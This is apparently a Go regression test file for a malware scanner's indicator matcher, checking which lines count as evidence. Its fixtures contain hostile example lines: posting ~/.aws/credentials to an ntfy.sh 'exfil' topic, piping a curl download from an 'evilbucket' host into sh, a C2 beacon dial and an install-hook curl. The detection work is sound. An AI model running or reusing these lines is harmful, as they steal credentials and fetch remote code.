package iocscan

import (
	"strings"
	"testing"

	"github.com/vulnetix/malscan-engine/detect"
)

// Regression tests from the 2026-10-26 GCVE malware audit. IOC-STIX-MATCH was the largest
// false-positive rule there (10,922 matched lines on withdrawn records). The lines below are
// real withdrawn lines; the indicator values are put in the set as an external feed would
// carry them (no source:registry label), so only the matcher's own logic decides.

// auditMatcher builds a matcher over third-party indicators for the given values. Values that
// contain "://" are url indicators, dotted quads are ipv4, everything else is a domain.
func auditMatcher(values ...string) *Matcher {
	set := NewIndicatorSet()
	for _, v := range values {
		t := TypeDomain
		switch {
		case strings.Contains(v, "://"):
			t = TypeURL
		case strictIPv4(v):
			t = TypeIPv4
		}
		set.Add(&Indicator{Type: t, Value: v, Labels: []string{"malicious-activity", "source:threat-intel-blocklist"}})
	}
	return NewMatcher(set, 0)
}

// evidenceLines returns the 1-based line numbers that carry a ClassEvidence hit.
func evidenceLines(ev []Evidence) []int {
	var out []int
	seen := map[int]bool{}
	for _, e := range ev {
		if e.Class == detect.ClassContext || seen[e.LineNumber] {
			continue
		}
		seen[e.LineNumber] = true
		out = append(out, e.LineNumber)
	}
	return out
}

// Resolver, root-server, CHAOS-name and vendor-host lines from withdrawn records produce no
// evidence even when the feed lists every value on them.
func TestAuditDNSInfraLinesDoNotMatch(t *testing.T) {
	m := auditMatcher("8.26.56.26", "8.20.247.20", "198.41.0.4", "192.5.6.30", "94.140.14.140",
		"223.5.5.0", "version.bind", "id.server", "api.adoptium.net", "dashscope.aliyuncs.com")
	for _, line := range []string{
		`"8.26.56.26",      // Comodo`,
		`new PublicResolver('comodo', 'Comodo Secure DNS', '8.26.56.26', 'Global (anycast)'),`,
		`'a.root-servers.net' => '198.41.0.4',`,
		`->stubResponse('example.com', RecordType::NS, referral('com', 'a.gtld-servers.net', '192.5.6.30'), nameserver: $rootIp)`,
		`system bin/"kdig", "@94.140.14.140", "www.knot-dns.cz", "+quic"`,
		"const url = `https://dns.alidns.com/resolve?name=${encodeURIComponent(host)}&type=A&edns_client_subnet=223.5.5.0%2F24`;",
		`values = fp.chaos_txt(ip, port, "version.bind")`,
		`("id.server", false, DigOpt::Chaos("id.server.")),`,
		`"https://api.adoptium.net/v3/assets/latest/{JDK_MAJOR}/hotspot?os={os}&architecture={arch}&image_type=jdk&vendor=eclipse"`,
		`base_url="https://dashscope.aliyuncs.com/compatible-mode/v1",`,
	} {
		if got := evidenceLines(m.MatchText("pkg/src/lib.rs", line)); len(got) != 0 {
			t.Errorf("withdrawn line still yields evidence: %s", line)
		}
	}
}

// The verified-malware lines from the same audit still match: a hard-coded activation gate
// on a droplet IP (two composer records) and exfil URLs on paste / webhook services.
func TestAuditVerifiedMalwareLinesStillMatch(t *testing.T) {
	m := auditMatcher("206.189.81.181", "https://pastebin.com/api/api_post.php",
		"http://canarytokens.com/static/gru8rg2n4oxvn2u82l4jxftcy/contact.php")
	for _, line := range []string{
		`$gate = "http://206.189.81.181/check_activation/".$url;`,
		`$url = curl_init('http://206.189.81.181/'.'insert_domain/'.$url);`,
		`"https://pastebin.com/api/api_post.php",`,
		`_URL = "http://canarytokens.com/static/gru8rg2n4oxvn2u82l4jxftcy/contact.php"`,
	} {
		if got := evidenceLines(m.MatchText("pkg/src/index.php", line)); len(got) != 1 {
			t.Errorf("verified-malware line lost its evidence: %s", line)
		}
	}
}

// A bare host or front-end address of a multi-tenant platform cannot name a tenant, so the hit
// is corroboration only. Lines are from withdrawn audit records.
func TestAuditSharedHostHitsAreContext(t *testing.T) {
	m := auditMatcher("www.dropbox.com", "f005.backblazeb2.com", "ntfy.sh", "76.76.21.21",
		"140.82.121.4", "185.199.108.153")
	for _, line := range []string{
		`url "https://www.dropbox.com/download?build=#{version}&plat=mac&rtoken=&type=full&arch=arm64"`,
		`url "https://f005.backblazeb2.com/file/screenmemory/ScreenMemory.#{version}.dmg"`,
		`homepage "https://ntfy.sh/"`,
		`content: '76.76.21.21',`,
		`assert (status, records) == ("NOERROR", ["140.82.121.4"])`,
		`"resolved_hosts": ["185.199.108.153"],`,
	} {
		ev := m.MatchText("pkg/src/main.go", line)
		if len(ev) == 0 {
			t.Errorf("shared-host hit must still be recorded as corroboration: %s", line)
		}
		if got := evidenceLines(ev); len(got) != 0 {
			t.Errorf("shared-host hit must not be evidence: %s", line)
		}
	}
}

// Data lists from withdrawn records: a crawler CIDR allow-list, a generated prefix table, a
// one-line Tor exit list, a host map, and DNS records in zone-file syntax. Every listed value is
// in the set; none of them may mint, and every hit is still recorded.
func TestAuditDataListsAreContext(t *testing.T) {
	cases := map[string]string{
		"crawler CIDR allow-list": "$googlebot = [\n" +
			"    '66.249.64.224/27',\n    '66.249.66.32/27',\n    '66.249.68.128/27',\n" +
			"    '66.249.68.160/27',\n    '66.249.69.32/27',\n    '66.249.70.32/27',\n];\n",
		"generated prefix table": "" +
			"\t{\n\t\tPrefix:             netip.MustParsePrefix(\"1.178.1.0/24\"),\n\t},\n" +
			"\t{\n\t\tPrefix:             netip.MustParsePrefix(\"1.178.10.0/24\"),\n\t},\n" +
			"\t{\n\t\tPrefix:             netip.MustParsePrefix(\"1.178.100.0/24\"),\n\t},\n" +
			"\t{\n\t\tPrefix:             netip.MustParsePrefix(\"1.178.101.0/24\"),\n\t},\n" +
			"\t{\n\t\tPrefix:             netip.MustParsePrefix(\"1.178.102.0/24\"),\n\t},\n",
		"one-line tor exit list": `    "185.220.101.42", "45.155.205.233", "94.232.46.202", "80.82.77.139", "162.247.74.27",` + "\n",
		"tor exit map": "TOR = {\n" +
			`    "185.220.101.5": {"category": "Tor Exit Node", "confidence": 85},` + "\n" +
			`    "185.220.101.6": {"category": "Tor Exit Node", "confidence": 85},` + "\n" +
			"    # relays seen this week\n" +
			`    "171.25.193.20": {"category": "Tor Exit Node", "confidence": 85},` + "\n" +
			`    "171.25.193.25": {"category": "Tor Exit Node", "confidence": 85},` + "\n" +
			`    "198.96.155.3": {"category": "Tor Exit Node", "confidence": 85},` + "\n}\n",
		"host map": "" +
			`'github.com': ['20.205.243.166', '140.82.121.4'],` + "\n" +
			`'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133'],` + "\n" +
			`'objects.githubusercontent.com': ['185.199.108.133', '185.199.109.133'],` + "\n",
		"zone file":     "A.ROOT-SERVERS.NET.      3600000      A     198.41.0.4\n",
		"NewRR fixture": `rr, _ := dns.NewRR("foo.github.io. 300 IN A 185.199.108.153")` + "\n",
		"bare ip list":  "134.195.4.2\n195.46.39.40\n205.171.3.65\n216.146.35.35\n216.146.36.36\n",
	}
	values := []string{"66.249.64.224", "66.249.66.32", "66.249.68.128", "66.249.68.160",
		"66.249.69.32", "66.249.70.32", "1.178.1.0", "1.178.10.0", "1.178.100.0",
		"185.220.101.42", "45.155.205.233", "94.232.46.202", "80.82.77.139", "162.247.74.27",
		"185.220.101.5", "185.220.101.6", "171.25.193.20", "171.25.193.25", "198.96.155.3",
		"20.205.243.166", "198.41.0.5", "134.195.4.2", "205.171.3.65", "216.146.35.36"}
	m := auditMatcher(values...)
	// The zone-file and NewRR cases carry addresses that are not in the set unless added here.
	m.set.Add(&Indicator{Type: TypeIPv4, Value: "198.41.0.4"})
	for name, content := range cases {
		ev := m.MatchText("pkg/src/data.go", content)
		if got := evidenceLines(ev); len(got) != 0 {
			t.Errorf("%s: list lines %v still yield evidence", name, got)
		}
	}
}

// A short C2 list, a list of endpoint URLs, and an address used inside a URL in a list keep full
// weight: the list rule demotes only bare data literals, in blocks of five or more.
func TestAuditDataListRuleKeepsEndpoints(t *testing.T) {
	m := auditMatcher("45.137.21.9", "45.137.21.10", "45.137.21.11", "45.137.21.12",
		"45.137.21.13", "evil-c2.io")
	cases := map[string]int{
		// three hard-coded C2 addresses: below the block size
		"const SERVERS = [\n  \"45.137.21.9\",\n  \"45.137.21.10\",\n  \"45.137.21.11\",\n];\n": 3,
		// a list of URLs is a list of endpoints
		"urls = [\n 'http://45.137.21.9/a', 'http://45.137.21.10/b', 'http://45.137.21.11/c',\n" +
			" 'http://45.137.21.12/d', 'http://45.137.21.13/e',\n]\n": 2,
		// a connection to a listed address is a use, not a list row
		"sock.connect((\"45.137.21.9\", 443))\nrequests.get(\"https://evil-c2.io/x\")\n": 2,
	}
	for content, want := range cases {
		if got := evidenceLines(m.MatchText("pkg/index.js", content)); len(got) != want {
			t.Errorf("want %d evidence lines, got %v in:\n%s", want, got, content)
		}
	}
}

// vdb-manager passes MatchText one blob per package, named after its manifest, with each member
// after a `// ==== path ====` (Go, npm, cargo, packagist, maven), `# ==== path ====` (pypi,
// rubygems, pub) or `<!-- ==== path ==== -->` (nuget) separator. A test, testdata or Markdown
// member is tiered by its own path; the code members around it are not.
func TestAuditConcatenatedMembersAreTieredByPath(t *testing.T) {
	m := auditMatcher("185.220.101.5", "185.177.72.23", "45.137.21.9", "updater.py")
	blob := "module github.com/acme/logwatch\n\ngo 1.22\n" +
		"\n// ==== github.com/acme/logwatch@v1.2.0/parse_test.go ====\n" +
		"\tline := `185.220.101.5 - - [19/May/2026:12:00:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"python-requests/2.28\"`\n" +
		"\n// ==== github.com/acme/logwatch@v1.2.0/testdata/access.log ====\n" +
		"185.177.72.23 - - [02/Apr/2026:10:00:00 +0000] \"GET / HTTP/1.1\" 200 1000\n" +
		"\n// ==== github.com/acme/logwatch@v1.2.0/README.md ====\n" +
		"Blocks scanners such as 185.177.72.23 by default.\n" +
		"\n// ==== github.com/acme/logwatch@v1.2.0/beacon.go ====\n" +
		"\tconn, _ := net.Dial(\"tcp\", \"45.137.21.9:443\")\n"
	ev := m.MatchText("github.com/acme/logwatch/go.mod", blob)
	lines := splitLinesString(blob)
	var evidence, context []string
	for _, e := range ev {
		if e.Class == detect.ClassContext {
			context = append(context, lines[e.LineNumber-1])
		} else {
			evidence = append(evidence, lines[e.LineNumber-1])
		}
	}
	if len(evidence) != 1 || !strings.Contains(evidence[0], "45.137.21.9") {
		t.Errorf("only the beacon.go dial may be evidence; got %q", evidence)
	}
	if len(context) != 3 {
		t.Errorf("the _test.go, testdata/ and README.md hits are recorded as context; got %q", context)
	}

	py := "from setuptools import setup\n" +
		"\n# ==== acme-1.0/acme/core/updater.py ====\n" +
		"URL = 'x'\n" +
		"\n# ==== acme-1.0/tests/test_tor.py ====\n" +
		"assert is_tor('185.220.101.5')\n"
	ev = m.MatchText("acme/setup.py", py)
	if got := evidenceLines(ev); len(got) != 0 {
		t.Errorf("pypi separator file name or tests/ member yielded evidence on lines %v", got)
	}
	nuget := "<!-- ==== build/acme.targets ==== -->\n<Exec Command=\"curl http://45.137.21.9/x\" />\n"
	if got := evidenceLines(m.MatchText("acme/install", nuget)); len(got) != 1 {
		t.Errorf("an install-hook member must keep its evidence; got %v", got)
	}
}

// A url indicator on a shared platform names one tenant's payload and keeps full weight, and a
// tenant-named host on the same provider is not shared.
func TestAuditSharedHostURLAndTenantHostsStillMatch(t *testing.T) {
	m := auditMatcher("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1",
		"https://ntfy.sh/exfil-topic-9f2", "evilbucket.s3.us-west-004.backblazeb2.com",
		"rocket-sense.duckdns.org")
	for _, line := range []string{
		`urllib.request.urlopen("https://www.dropbox.com/scl/fi/abc123/stage2.exe?dl=1")`,
		`requests.post("https://ntfy.sh/exfil-topic-9f2", data=open(os.path.expanduser("~/.aws/credentials")).read())`,
		`curl -fsSL https://evilbucket.s3.us-west-004.backblazeb2.com/x.sh | sh`,
		`url: Url::parse("https://rocket-sense.duckdns.org/api/v1")`,
	} {
		if got := evidenceLines(m.MatchText("pkg/setup.py", line)); len(got) != 1 {
			t.Errorf("tenant-specific indicator lost its evidence: %s", line)
		}
	}
}
